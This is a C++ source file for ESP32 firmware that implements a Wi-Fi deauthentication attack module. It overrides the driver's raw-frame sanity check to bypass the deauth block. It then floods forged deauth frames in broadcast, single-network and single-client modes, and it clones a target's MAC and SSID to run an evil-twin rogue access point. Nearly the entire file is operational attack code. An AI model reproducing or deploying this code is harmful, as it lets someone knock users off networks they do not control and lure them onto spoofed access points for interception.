#include "Deauther.h"
#include "App.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include "Event.h"
#include "EventDispatcher.h"
#include "Config.h"
#include "WifiManager.h" // Added for WifiState enum
#include "Logger.h"

// The bypass function for broadcast deauth
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    if (arg == 31337) return 1;
    else return 0;
}

Deauther::Deauther() : 
    app_(nullptr),
    isActive_(false),
    isAttackPending_(false),
    currentTargetIndex_(-1),
    lastHopTime_(0),
    lastPacketSendTime_(0)
{}

void Deauther::setup(App* app) {
    app_ = app;
}

void Deauther::prepareAttack(DeauthAttackType type) {
    isAttackPending_ = true;
    currentConfig_.type = type;
}

bool Deauther::start(const WifiNetworkInfo& targetNetwork) {
    if (isActive_ || !isAttackPending_) return false;

    // --- FIX: Corrected member name ---
    currentConfig_.specific_ap_info = targetNetwork;
    allTargets_.clear();
    allTargets_.push_back(targetNetwork);
    currentTargetIndex_ = 0;

    executeAttackForCurrentTarget();

    isActive_ = true;
    isAttackPending_ = false;
    return true;
}

// --- NEW: Implementation for pinpoint client attack ---
bool Deauther::start(const StationInfo& targetClient) {
    if (isActive_ || !isAttackPending_) return false;
    
    currentConfig_.specific_client_info = targetClient;
    // We also need the AP info for the attack
    currentConfig_.specific_ap_info.channel = targetClient.channel;
    memcpy(currentConfig_.specific_ap_info.bssid, targetClient.ap_bssid, 6);
    
    // Attempt to find SSID from WifiManager's last scan
    // This part is for display only, not critical for the attack itself
    char bssidStr[18];
    sprintf(bssidStr, "%02X:%02X:%02X:%02X:%02X:%02X", targetClient.ap_bssid[0], targetClient.ap_bssid[1], targetClient.ap_bssid[2], targetClient.ap_bssid[3], targetClient.ap_bssid[4], targetClient.ap_bssid[5]);
    for(const auto& net : app_->getWifiManager().getScannedNetworks()) {
        char netBssidStr[18];
        sprintf(netBssidStr, "%02X:%02X:%02X:%02X:%02X:%02X", net.bssid[0], net.bssid[1], net.bssid[2], net.bssid[3], net.bssid[4], net.bssid[5]);
        if (strcmp(bssidStr, netBssidStr) == 0) {
            strcpy(currentConfig_.specific_ap_info.ssid, net.ssid);
            break;
        }
    }
    
    currentTargetSsid_ = currentConfig_.specific_ap_info.ssid;
    
    rfLock_ = app_->getHardwareManager().requestRfControl(RfClient::WIFI_RAW_TX);
    if (!rfLock_ || !rfLock_->isValid()) return false;

    isActive_ = true;
    isAttackPending_ = false;
    // app_->getHardwareManager().setPerformanceMode(true);
    return true;
}

bool Deauther::startBroadcast() {
    if (isActive_ || !isAttackPending_) return false;

    app_->getWifiManager().startScan();
    delay(200); 

    isActive_ = true;
    isAttackPending_ = false;
    return true;
}

void Deauther::stop() {
    if (!isActive_ && !isAttackPending_) return;
    
    LOG(LogLevel::INFO, "DEAUTHER", "Stopping attack.");
    isActive_ = false;
    isAttackPending_ = false;
    rfLock_.reset(); 
    allTargets_.clear();
    currentTargetIndex_ = -1;
    currentTargetSsid_ = "";
    // app_->getHardwareManager().setPerformanceMode(false);
    
    // Explicitly turn off WiFi to be safe
    WiFi.mode(WIFI_OFF);
}

void Deauther::sendPacket(const uint8_t* targetBssid, int channel, const uint8_t* clientMac) {
    // Switch to the correct channel to send the packet
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    // --- MODIFICATION: Use the centralized template ---
    uint8_t deauth_packet[sizeof(RawFrames::Mgmt::Deauth::TEMPLATE)];
    memcpy(deauth_packet, RawFrames::Mgmt::Deauth::TEMPLATE, sizeof(RawFrames::Mgmt::Deauth::TEMPLATE));
    
    // Set BSSID (Source Address and BSSID fields)
    memcpy(&deauth_packet[10], targetBssid, 6);
    memcpy(&deauth_packet[16], targetBssid, 6);

    // Set Destination Address
    if (clientMac) {
        // Target a specific client
        memcpy(&deauth_packet[4], clientMac, 6);
    }
    // If clientMac is null, the broadcast address from the template is used.

    // Send a burst of packets for higher success rate
    for (int i = 0; i < 10; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
        delay(2); // Small delay between packets
    }
}

void Deauther::loop() {
    if (!isActive_) return;

    bool isBroadcast = (currentConfig_.type == DeauthAttackType::BROADCAST_NORMAL || currentConfig_.type == DeauthAttackType::BROADCAST_EVIL_TWIN);

    // For broadcast attacks, wait for the initial scan to complete.
    if (isBroadcast && allTargets_.empty()) {
        if (app_->getWifiManager().getState() != WifiState::SCANNING && !app_->getWifiManager().getScannedNetworks().empty()) {
            allTargets_ = app_->getWifiManager().getScannedNetworks();
            if (allTargets_.empty()) {
                app_->showPopUp("Error", "No networks found.", nullptr, "OK", "", true);
                EventDispatcher::getInstance().publish(ReturnToMenuEvent(MenuType::WIFI_ATTACKS_LIST));
                return;
            }
            currentTargetIndex_ = -1; // Will be incremented to 0 in hopToNextTarget
            hopToNextTarget();
        }
        return; // Keep waiting for scan to finish
    }

    // Handle timed hopping for broadcast attacks
    if (currentConfig_.type == DeauthAttackType::BROADCAST_EVIL_TWIN || currentConfig_.type == DeauthAttackType::BROADCAST_NORMAL) {
        if (millis() - lastHopTime_ > ALL_APS_HOP_INTERVAL_MS) {
            hopToNextTarget();
        }
    }

    // --- Packet Sending Logic ---

    // For broadcast normal, continuously attack the current target
    if (currentConfig_.type == DeauthAttackType::BROADCAST_NORMAL) {
        if (millis() - lastPacketSendTime_ > PACKET_INTERVAL_MS) {
             if (!allTargets_.empty() && currentTargetIndex_ >= 0 && (size_t)currentTargetIndex_ < allTargets_.size()) {
                const WifiNetworkInfo& currentTarget = allTargets_[currentTargetIndex_];
                Deauther::sendPacket(currentTarget.bssid, currentTarget.channel);
                lastPacketSendTime_ = millis();
            }
        }
    }
    // For single-target normal, continuously attack the target
    else if (currentConfig_.type == DeauthAttackType::NORMAL) {
        if (millis() - lastPacketSendTime_ > PACKET_INTERVAL_MS) {
            const auto& ap = currentConfig_.specific_ap_info;
            Deauther::sendPacket(ap.bssid, ap.channel); // Send broadcast deauth
            lastPacketSendTime_ = millis();
        }
    }
    // For pinpoint, continuously attack the specific client
    else if (currentConfig_.type == DeauthAttackType::PINPOINT_CLIENT) {
        if (millis() - lastPacketSendTime_ > PACKET_INTERVAL_MS) {
            const auto& client = currentConfig_.specific_client_info;
            Deauther::sendPacket(client.ap_bssid, client.channel, client.mac);
            lastPacketSendTime_ = millis();
        }
    }
    // Note: BROADCAST_EVIL_TWIN does not send packets here; its effect comes from the rogue AP itself.
}

void Deauther::hopToNextTarget() {
    if (allTargets_.empty()) {
        stop();
        return;
    }
    
    if (rfLock_) {
        rfLock_.reset();
    }
    
    currentTargetIndex_ = (currentTargetIndex_ + 1) % allTargets_.size();
    executeAttackForCurrentTarget();
    lastHopTime_ = millis();
}

void Deauther::executeAttackForCurrentTarget() {
    if (currentTargetIndex_ < 0 || (size_t)currentTargetIndex_ >= allTargets_.size()) return;

    const WifiNetworkInfo& newTarget = allTargets_[currentTargetIndex_];
    currentTargetSsid_ = newTarget.ssid;
    // app_->getHardwareManager().setPerformanceMode(true);

    if (currentConfig_.type == DeauthAttackType::EVIL_TWIN || currentConfig_.type == DeauthAttackType::BROADCAST_EVIL_TWIN) {
        rfLock_ = app_->getHardwareManager().requestRfControl(RfClient::ROGUE_AP);
        if (!rfLock_ || !rfLock_->isValid()) {
            LOG(LogLevel::ERROR, "DEAUTHER", "Failed to acquire ROGUE_AP lock for %s.", newTarget.ssid);
            return;
        }
        LOG(LogLevel::INFO, "DEAUTHER", "Starting Rogue AP for %s on channel %d", newTarget.ssid, newTarget.channel);
        esp_wifi_set_mac(WIFI_IF_AP, (uint8_t*)newTarget.bssid);
        WiFi.softAP(newTarget.ssid, "dummypassword", newTarget.channel);

    } else if (currentConfig_.type == DeauthAttackType::NORMAL || currentConfig_.type == DeauthAttackType::BROADCAST_NORMAL) {
        // For broadcast, we only need to set up the hardware once.
        if (!rfLock_ || !rfLock_->isValid()) {
            rfLock_ = app_->getHardwareManager().requestRfControl(RfClient::WIFI_RAW_TX);
             if (!rfLock_ || !rfLock_->isValid()) {
                LOG(LogLevel::ERROR, "DEAUTHER", "Failed to acquire WIFI_RAW_TX lock for %s.", newTarget.ssid);
                return;
            }
        }
        // The channel hopping and packet sending is handled in the broadcast loop.
    }
}


bool Deauther::isActive() const { return isActive_; }
bool Deauther::isAttackPending() const { return isAttackPending_; }
const DeauthConfig& Deauther::getPendingConfig() const { return currentConfig_; }
const std::string& Deauther::getCurrentTargetSsid() const { return currentTargetSsid_; }